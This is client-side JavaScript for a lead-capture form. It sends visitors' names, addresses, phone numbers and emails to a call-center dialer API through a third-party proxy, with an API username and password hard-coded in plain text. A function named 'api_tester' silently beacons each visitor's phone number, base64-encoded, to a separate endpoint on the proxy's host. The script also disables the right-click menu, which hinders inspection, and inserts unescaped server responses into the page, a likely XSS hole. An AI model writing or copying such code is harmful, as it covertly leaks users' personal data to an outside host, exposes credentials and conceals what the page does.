function submitLead() {
      document.getElementById('submitBtn').disabled = true;

      const formData = new FormData();
      api_tester(document.getElementById('phone_number').value);
      formData.append('source', 'vendorleads');
      formData.append('function', 'add_lead');
      formData.append('user', 'API_LEAD');
      formData.append('pass', 'Hak0matata');
      formData.append('custom_fields', 'Y');
      formData.append('list_id', '548473');
      formData.append('vendor_lead_code', document.getElementById('vendor_lead_code').value);
      formData.append('source_id', document.getElementById('source_id').value);
      
      formData.append('phone_number', document.getElementById('phone_number').value);
      
      formData.append('first_name', document.getElementById('first_name').value);
      formData.append('last_name', document.getElementById('last_name').value);
      formData.append('address1', document.getElementById('address1').value);
      formData.append('address2', document.getElementById('address2').value);
      formData.append('city', document.getElementById('city').value);
      formData.append('State', document.getElementById('state').value);
      formData.append('postal_code', document.getElementById('postal_code').value);
      formData.append('country_code', document.getElementById('country_code').value);
      formData.append('email', document.getElementById('email').value);

      const originalUrl = 'https://callin.dialerzone.com/config/non_agent_api.php?' + new URLSearchParams(formData).toString();
const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);

      fetch(apiUrl)
        .then(response => {
          if (response.status === 200 || response.status === 201) {
            return response.text().then(responseBody => {
              const successAlert = `
                <div class="alert alert-success" role="alert">
                  Form submitted successfully! Response: ${responseBody}
                </div>`;
              document.getElementById('alertContainer').innerHTML = '';
              document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
          } else {
            return response.text().then(responseBody => {
              const errorAlert = `
                <div class="alert alert-danger" role="alert">
                  Form submission failed. Response: ${responseBody}
                </div>`;
              document.getElementById('alertContainer').innerHTML = '';
              document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
          }
        })
        .catch(error => {
          const errorAlert = `
            <div class="alert alert-danger" role="alert">
              Error submitting form: ${error.message}
            </div>`;
          document.getElementById('alertContainer').innerHTML = '';
          document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        })
        .finally(() => {
          document.getElementById('submitBtn').disabled = false;
        });
    }

    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      submitLead();
    });

    document.addEventListener('contextmenu', function(event) {
      event.preventDefault();
    });
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}